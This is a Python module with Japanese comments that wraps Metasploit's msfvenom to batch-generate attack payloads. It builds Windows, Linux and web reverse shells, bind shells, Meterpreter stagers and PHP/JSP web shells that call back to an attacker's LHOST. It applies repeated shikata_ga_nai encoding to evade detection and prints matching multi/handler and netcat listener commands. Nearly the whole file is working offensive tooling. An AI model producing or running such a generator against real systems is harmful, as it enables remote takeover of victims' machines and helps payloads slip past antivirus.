#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ペイロード生成モジュール
msfvenomを使ったペイロードファイル生成機能
"""

import os
import subprocess
import json
import time
from datetime import datetime

class PayloadGenerator:
    """msfvenomを使ったペイロード生成クラス"""
    
    def __init__(self, output_dir="payloads"):
        self.output_dir = output_dir
        self.results = {
            'generated_payloads': [],
            'errors': [],
            'timestamp': datetime.now().isoformat()
        }
        
        # 出力ディレクトリの作成
        os.makedirs(output_dir, exist_ok=True)
        
        # よくあるペイロード設定
        self.common_payloads = {
            'windows': {
                'reverse_shell': {
                    'payload': 'windows/shell_reverse_tcp',
                    'description': 'Windowsリバースシェル',
                    'required_params': ['LHOST', 'LPORT']
                },
                'meterpreter': {
                    'payload': 'windows/meterpreter/reverse_tcp',
                    'description': 'Windows Meterpreter',
                    'required_params': ['LHOST', 'LPORT']
                },
                'bind_shell': {
                    'payload': 'windows/shell_bind_tcp',
                    'description': 'Windowsバインドシェル',
                    'required_params': ['LPORT']
                },
                'staged': {
                    'payload': 'windows/meterpreter/reverse_tcp',
                    'description': 'Windowsステージドペイロード',
                    'required_params': ['LHOST', 'LPORT']
                }
            },
            'linux': {
                'reverse_shell': {
                    'payload': 'linux/x86/shell_reverse_tcp',
                    'description': 'Linuxリバースシェル',
                    'required_params': ['LHOST', 'LPORT']
                },
                'meterpreter': {
                    'payload': 'linux/x86/meterpreter/reverse_tcp',
                    'description': 'Linux Meterpreter',
                    'required_params': ['LHOST', 'LPORT']
                },
                'bind_shell': {
                    'payload': 'linux/x86/shell_bind_tcp',
                    'description': 'Linuxバインドシェル',
                    'required_params': ['LPORT']
                }
            },
            'web': {
                'php_reverse_shell': {
                    'payload': 'php/reverse_php',
                    'description': 'PHPリバースシェル',
                    'required_params': ['LHOST', 'LPORT']
                },
                'jsp_reverse_shell': {
                    'payload': 'java/jsp_shell_reverse_tcp',
                    'description': 'JSPリバースシェル',
                    'required_params': ['LHOST', 'LPORT']
                },
                'asp_reverse_shell': {
                    'payload': 'windows/shell/reverse_tcp',
                    'description': 'ASPリバースシェル',
                    'required_params': ['LHOST', 'LPORT']
                }
            }
        }
    
    def check_msfvenom(self):
        """msfvenomが利用可能かチェック"""
        try:
            result = subprocess.run(['msfvenom', '--help'], 
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
            return False
    
    def generate_payload(self, payload_type, platform, lhost=None, lport=4444, 
                        output_format='raw', filename=None, encoder=None, iterations=1):
        """
        ペイロードを生成
        
        Args:
            payload_type (str): ペイロードタイプ ('reverse_shell', 'meterpreter', 'bind_shell', etc.)
            platform (str): プラットフォーム ('windows', 'linux', 'web')
            lhost (str): リスナーのIPアドレス
            lport (int): リスナーのポート
            output_format (str): 出力形式 ('raw', 'exe', 'elf', 'php', 'jsp', 'asp')
            filename (str): 出力ファイル名
            encoder (str): エンコーダー ('shikata_ga_nai', 'x86/shikata_ga_nai', etc.)
            iterations (int): エンコーダーの繰り返し回数
        """
        
        # msfvenomの存在確認
        if not self.check_msfvenom():
            error_msg = "msfvenomが見つかりません。Metasploit Frameworkがインストールされているか確認してください。"
            self.results['errors'].append(error_msg)
            return None
        
        # ペイロード設定の取得
        if platform not in self.common_payloads:
            error_msg = f"サポートされていないプラットフォーム: {platform}"
            self.results['errors'].append(error_msg)
            return None
        
        if payload_type not in self.common_payloads[platform]:
            error_msg = f"サポートされていないペイロードタイプ: {payload_type}"
            self.results['errors'].append(error_msg)
            return None
        
        payload_config = self.common_payloads[platform][payload_type]
        payload_name = payload_config['payload']
        
        # 必須パラメータのチェック
        if 'LHOST' in payload_config['required_params'] and not lhost:
            error_msg = "LHOSTパラメータが必要です"
            self.results['errors'].append(error_msg)
            return None
        
        # ファイル名の生成
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{platform}_{payload_type}_{timestamp}"
        
        # 出力ファイルパス
        output_path = os.path.join(self.output_dir, filename)
        
        # msfvenomコマンドの構築
        cmd = ['msfvenom']
        cmd.extend(['-p', payload_name])
        
        # パラメータの追加
        if lhost:
            cmd.extend(['LHOST=' + str(lhost)])
        if lport:
            cmd.extend(['LPORT=' + str(lport)])
        
        # 出力形式の設定
        if output_format == 'exe':
            cmd.extend(['-f', 'exe'])
            output_path += '.exe'
        elif output_format == 'elf':
            cmd.extend(['-f', 'elf'])
            output_path += '.elf'
        elif output_format == 'php':
            cmd.extend(['-f', 'raw'])
            output_path += '.php'
        elif output_format == 'jsp':
            cmd.extend(['-f', 'raw'])
            output_path += '.jsp'
        elif output_format == 'asp':
            cmd.extend(['-f', 'raw'])
            output_path += '.asp'
        else:
            cmd.extend(['-f', 'raw'])
            output_path += '.bin'
        
        # エンコーダーの設定
        if encoder:
            cmd.extend(['-e', encoder])
            if iterations > 1:
                cmd.extend(['-i', str(iterations)])
        
        # 出力ファイルの指定
        cmd.extend(['-o', output_path])
        
        # バッドキャラクターの回避
        cmd.extend(['--bad-chars', '\\x00\\x0a\\x0d'])
        
        try:
            print(f"🔧 ペイロード生成中: {payload_config['description']}")
            print(f"📝 コマンド: {' '.join(cmd)}")
            
            # msfvenomの実行
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                # 成功時の処理
                payload_info = {
                    'type': payload_type,
                    'platform': platform,
                    'payload_name': payload_name,
                    'description': payload_config['description'],
                    'output_file': output_path,
                    'lhost': lhost,
                    'lport': lport,
                    'encoder': encoder,
                    'iterations': iterations,
                    'generated_at': datetime.now().isoformat(),
                    'file_size': os.path.getsize(output_path) if os.path.exists(output_path) else 0
                }
                
                self.results['generated_payloads'].append(payload_info)
                
                print(f"✅ ペイロード生成成功: {output_path}")
                print(f"📊 ファイルサイズ: {payload_info['file_size']} bytes")
                
                return payload_info
            else:
                error_msg = f"ペイロード生成失敗: {result.stderr}"
                self.results['errors'].append(error_msg)
                print(f"❌ {error_msg}")
                return None
                
        except subprocess.TimeoutExpired:
            error_msg = "ペイロード生成がタイムアウトしました"
            self.results['errors'].append(error_msg)
            print(f"❌ {error_msg}")
            return None
        except Exception as e:
            error_msg = f"ペイロード生成中にエラーが発生: {str(e)}"
            self.results['errors'].append(error_msg)
            print(f"❌ {error_msg}")
            return None
    
    def generate_common_payloads(self, lhost, lport=4444):
        """よくあるペイロードを一括生成"""
        print("🚀 よくあるペイロードを一括生成中...")
        
        generated = []
        
        # Windowsペイロード
        windows_payloads = [
            ('reverse_shell', 'exe'),
            ('meterpreter', 'exe'),
            ('bind_shell', 'exe')
        ]
        
        for payload_type, format_type in windows_payloads:
            result = self.generate_payload(
                payload_type=payload_type,
                platform='windows',
                lhost=lhost,
                lport=lport,
                output_format=format_type,
                encoder='x86/shikata_ga_nai',
                iterations=3
            )
            if result:
                generated.append(result)
        
        # Linuxペイロード
        linux_payloads = [
            ('reverse_shell', 'elf'),
            ('meterpreter', 'elf'),
            ('bind_shell', 'elf')
        ]
        
        for payload_type, format_type in linux_payloads:
            result = self.generate_payload(
                payload_type=payload_type,
                platform='linux',
                lhost=lhost,
                lport=lport,
                output_format=format_type
            )
            if result:
                generated.append(result)
        
        # Webペイロード
        web_payloads = [
            ('php_reverse_shell', 'php'),
            ('jsp_reverse_shell', 'jsp')
        ]
        
        for payload_type, format_type in web_payloads:
            result = self.generate_payload(
                payload_type=payload_type,
                platform='web',
                lhost=lhost,
                lport=lport,
                output_format=format_type
            )
            if result:
                generated.append(result)
        
        print(f"✅ {len(generated)}個のペイロードを生成しました")
        return generated
    
    def generate_custom_payload(self, payload_name, lhost, lport=4444, 
                               output_format='raw', filename=None, 
                               encoder=None, iterations=1, bad_chars=None):
        """カスタムペイロードを生成"""
        
        if not self.check_msfvenom():
            error_msg = "msfvenomが見つかりません"
            self.results['errors'].append(error_msg)
            return None
        
        # ファイル名の生成
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"custom_{payload_name.replace('/', '_')}_{timestamp}"
        
        # 出力ファイルパス
        output_path = os.path.join(self.output_dir, filename)
        
        # msfvenomコマンドの構築
        cmd = ['msfvenom']
        cmd.extend(['-p', payload_name])
        cmd.extend(['LHOST=' + str(lhost)])
        cmd.extend(['LPORT=' + str(lport)])
        
        # 出力形式の設定
        if output_format == 'exe':
            cmd.extend(['-f', 'exe'])
            output_path += '.exe'
        elif output_format == 'elf':
            cmd.extend(['-f', 'elf'])
            output_path += '.elf'
        elif output_format == 'raw':
            cmd.extend(['-f', 'raw'])
            output_path += '.bin'
        else:
            cmd.extend(['-f', output_format])
            output_path += f'.{output_format}'
        
        # エンコーダーの設定
        if encoder:
            cmd.extend(['-e', encoder])
            if iterations > 1:
                cmd.extend(['-i', str(iterations)])
        
        # バッドキャラクターの設定
        if bad_chars:
            cmd.extend(['--bad-chars', bad_chars])
        else:
            cmd.extend(['--bad-chars', '\\x00\\x0a\\x0d'])
        
        # 出力ファイルの指定
        cmd.extend(['-o', output_path])
        
        try:
            print(f"🔧 カスタムペイロード生成中: {payload_name}")
            print(f"📝 コマンド: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                payload_info = {
                    'type': 'custom',
                    'payload_name': payload_name,
                    'output_file': output_path,
                    'lhost': lhost,
                    'lport': lport,
                    'encoder': encoder,
                    'iterations': iterations,
                    'bad_chars': bad_chars,
                    'generated_at': datetime.now().isoformat(),
                    'file_size': os.path.getsize(output_path) if os.path.exists(output_path) else 0
                }
                
                self.results['generated_payloads'].append(payload_info)
                print(f"✅ カスタムペイロード生成成功: {output_path}")
                return payload_info
            else:
                error_msg = f"カスタムペイロード生成失敗: {result.stderr}"
                self.results['errors'].append(error_msg)
                print(f"❌ {error_msg}")
                return None
                
        except Exception as e:
            error_msg = f"カスタムペイロード生成中にエラーが発生: {str(e)}"
            self.results['errors'].append(error_msg)
            print(f"❌ {error_msg}")
            return None
    
    def list_available_payloads(self):
        """利用可能なペイロードを一覧表示"""
        print("📋 利用可能なペイロード一覧:")
        print("=" * 60)
        
        for platform, payloads in self.common_payloads.items():
            print(f"\n🔸 {platform.upper()} プラットフォーム:")
            for payload_type, config in payloads.items():
                print(f"  • {payload_type}: {config['description']}")
                print(f"    ペイロード: {config['payload']}")
                print(f"    必須パラメータ: {', '.join(config['required_params'])}")
                print()
    
    def save_results(self, filename=None):
        """結果をJSONファイルに保存"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"payload_generation_{timestamp}.json"
        
        output_path = os.path.join(self.output_dir, filename)
        
        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            print(f"💾 結果を保存しました: {output_path}")
            return output_path
        except Exception as e:
            print(f"❌ 結果の保存に失敗: {str(e)}")
            return None
    
    def get_listener_commands(self, payload_info):
        """ペイロードに対応するリスナーコマンドを生成"""
        if not payload_info:
            return None
        
        payload_name = payload_info.get('payload_name', '')
        lhost = payload_info.get('lhost', '')
        lport = payload_info.get('lport', 4444)
        
        listener_commands = []
        
        # Meterpreterペイロードの場合
        if 'meterpreter' in payload_name:
            listener_commands.append({
                'tool': 'msfconsole',
                'command': f'use exploit/multi/handler',
                'description': 'Meterpreterハンドラーを設定'
            })
            listener_commands.append({
                'tool': 'msfconsole',
                'command': f'set PAYLOAD {payload_name}',
                'description': 'ペイロードを設定'
            })
            listener_commands.append({
                'tool': 'msfconsole',
                'command': f'set LHOST {lhost}',
                'description': 'リスナーIPを設定'
            })
            listener_commands.append({
                'tool': 'msfconsole',
                'command': f'set LPORT {lport}',
                'description': 'リスナーポートを設定'
            })
            listener_commands.append({
                'tool': 'msfconsole',
                'command': 'exploit -j',
                'description': 'バックグラウンドでリスナーを開始'
            })
        
        # シェルペイロードの場合
        elif 'shell' in payload_name:
            listener_commands.append({
                'tool': 'netcat',
                'command': f'nc -lvp {lport}',
                'description': 'Netcatでリバースシェルを待機'
            })
        
        return listener_commands 